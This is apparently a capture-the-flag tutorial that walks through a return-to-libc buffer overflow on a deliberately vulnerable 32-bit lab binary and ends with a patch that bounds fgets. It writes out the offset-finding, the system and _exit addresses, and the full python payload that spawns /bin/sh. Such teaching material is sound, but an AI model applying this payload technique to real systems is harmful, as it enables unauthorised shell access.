Before we look at the binary's code, we should see if the binary has any binary hardening mitigations. These can make it significantly harder to pwn the binary. We can do this using checksec from pwntools.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ pwn checksec b6
[*] '/Hackery/escape/buf_ovf/b6/b6'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

As you can see there, it is al 32-bit (i386) binary with NX enabled. NX stands for non-executable stack which means that anywhere that a user can write to cannot be executed as code. This means that we can no longer push shellcode
onto the stack, and then execute it. So let's look at the code...

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void nothing()
{
	char* buf0[50];
	fgets(buf0, 300, stdin);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
	_exit(1);
}

void ignore_this()
{
	char shield[500];
	strcpy(shield, "Block");
	system("echo hi");
	
}
```

So looking at the code, we see a couple of things. The first is that this time our buffer overflow is limited to just 300 characters because of the use of fgets(). We see in the ignore_this() function that there is a call to system,
however all that ill do is just echo "hi". We also see that we have no real way to change that particular implementation to give us a shell. However, the fact that it is in a method means that the system is established as a function in the binary's executable memory
with a hard coded address. This address can be called via a return to libc attack ,which we pass the argument "/bin/sh" to give us a shell (reason why we give it "/bon/sh" instead of bash is sh works better with input and output with our exploits).
The first thing we will need is the buffer between our input, and the eip register.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x080484ab <+0>:	push   ebp
   0x080484ac <+1>:	mov    ebp,esp
   0x080484ae <+3>:	sub    esp,0xd8
   0x080484b4 <+9>:	mov    eax,ds:0x80498a0
   0x080484b9 <+14>:	sub    esp,0x4
   0x080484bc <+17>:	push   eax
   0x080484bd <+18>:	push   0x12c
   0x080484c2 <+23>:	lea    eax,[ebp-0xd0]
   0x080484c8 <+29>:	push   eax
   0x080484c9 <+30>:	call   0x8048360 <fgets@plt>
   0x080484ce <+35>:	add    esp,0x10
   0x080484d1 <+38>:	nop
   0x080484d2 <+39>:	leave  
   0x080484d3 <+40>:	ret    
End of assembler dump.
gdb-peda$ b *nothing+35
Breakpoint 1 at 0x80484ce
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b6/b6 
Even if you do hack this elf, what are you going to do?. You should really get back to research.
75395128
```

One wall of text later...

```
Breakpoint 1, 0x080484ce in nothing ()
gdb-peda$ x/s $ebp-0xd0
0xffffcf68:	"75395128\n"
gdb-peda$ info frame
Stack level 0, frame at 0xffffd040:
 eip = 0x80484ce in nothing; saved eip = 0x80484fa
 called by frame at 0xffffd060
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebp at 0xffffd038, eip at 0xffffd03c
```

And onto the quest for the holy grail

```
>>> 0xffffd03c - 0xffffcf68
212
```

So we the offset between the start of our input and the eip register is 212. Now to find the address of the system function. Now we can do this using gdb-pead by typing "p system", howver gdb-peda sometimes changes that address for the version it runs. So it is best just to use objdump to view the address that is hardcoded into the binary.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ objdump -D b6 | grep system
08048380 <system@plt>:
 8048527:	e8 54 fe ff ff       	call   8048380 <system@plt>
```

So we have the address of the system function 0x08048380. Now something else we can do, since when the function returns it will just run the system function the function won't return again unless we make it. This means that after the system function, the program will just execute whatever is after the address of the system function untill the program either exits, encounters a segmentation fault, or we make it return.
So we could after the system call to /bin/sh is done, make the program just exit because the _exit function is also called. There are two benifets to doing this, first the program won't seg fault so it's less noisey. Secondly having the exta 4 byte string does help with trying to find the address of where "/bin/sh" is stored.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ objdump -D b6 | grep exit
08048340 <_exit@plt-0x10>:
08048350 <_exit@plt>:
 80484ff:	e8 4c fe ff ff       	call   8048350 <_exit@plt>
```

So our payload should look something like this.

```
payload = offset + system_address + exit_address + address_of_string + "/bin/sh"
```

First off, the reason why the argument for system "/bin/sh" is at the end is because stack grows to lower addresses, however our overflow is going in the opposite direction towards higher addresses. Because of that in order to properley format the argument we have to put it at the end in order to account for the fact our overflow is going the opposite directio.  Now at the moment the only piece of the payload we don't have is the address of the string "/bin/sh". 
 We can use gdb to find an address similar to where it is stored, then just move up and down in 16 decimal increemnts untill we find the right address like what we've been doing. If you want, you can 
 mess around with gdb-peda's enviornemtal variables because those do interfere with the address. To find the relative address, we will have to put in a fake 4 bute hex string in place of the actual address, because that hex string does interfere with where "/bin/sh" is stored.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*212 + "\x80\x83\x04\x08" + "\x50\x83\x04\x08" + "\x68\xd0\xff\xff" +  "/bin/sh"' > test
```

Now picking up from where we left off in gdb (with the same breakpoint)...

```
gdb-peda$ r < test
```

You know what goes here

```
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
 [heap] : 0x804a4f0 ("/bin/sh\n")
   libc : 0xf7f5d82b ("/bin/sh")
[stack] : 0xffffd048 ("/bin/sh\n")
```

So we have the relative address of /bin/sh which is 0xffffd048. Now To find the actual address. Here are the addresses I tried.

```
0xffffd048
0xffffd058
0xffffd068
```

Then we found the correct address, 0xffffd068. So our final exploit looks like this.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*212 + "\x80\x83\x04\x08" + "\x50\x83\x04\x08" + "\x68\xd0\xff\xff" +  "/bin/sh"' > pwn
```

Now to actually test the exploit. Now the reason why we need the second cat, is because if we just have one cat then the exploit will run and give us a shell but we wouldn't be able to actually interface with the shell. The second cat gives us io (input and output) with the binary.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ (cat pwn; cat) | ./b6
If you do not get back to your research now, we will have to implement corrective solutions.
ls
b6  b6.c  exploit.py  out  peda-session-b6.txt	pwn  test
echo This Works!
This Works!
cat out
Someone has been researching security overriding methods. Level Cleared!
exit
exit
```

And just like that, we pwned the binary. Now to fix it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ cat b6_secure.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void nothing()
{
	char* buf0[50];
	fgets(buf0, sizeof(buf0), stdin);
}

int main()
{
	printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
	nothing();
	_exit(1);
}

void ignore_this()
{
	char shield[500];
	strcpy(shield, "Block");
	system("echo hi");
	
}
```

As you can see, we just had to change a single word. let's test it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*500' | ./b6_secure 
If you do not get back to your research now, we will have to implement corrective solutions.
```

Just like that, we patched the binary.
